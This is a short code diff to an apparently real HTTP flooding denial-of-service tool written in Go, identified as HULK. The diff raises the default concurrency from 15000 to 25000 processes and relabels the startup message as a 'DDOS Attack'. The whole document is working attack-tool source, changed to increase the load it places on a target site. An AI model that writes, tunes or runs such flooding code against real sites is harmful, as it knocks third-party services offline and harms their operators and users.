@@ -93,7 +93,7 @@ func main() {
 	t := os.Getenv("HULKMAXPROCS")
 	maxproc, err := strconv.Atoi(t)
 	if err != nil {
-		maxproc = 15000
+		maxproc = 25000
 	}
 
 	u, err := url.Parse(site)
@@ -123,7 +123,7 @@ func main() {
 	}
 
 	go func() {
-		fmt.Println("-- HULK Attack Started --\n           Go!\n\n")
+		fmt.Println("-- DDOS Attack Started --\n           Go!\n\n")
 		ss := make(chan uint8, 8)
 		var (
 			err, sent int32
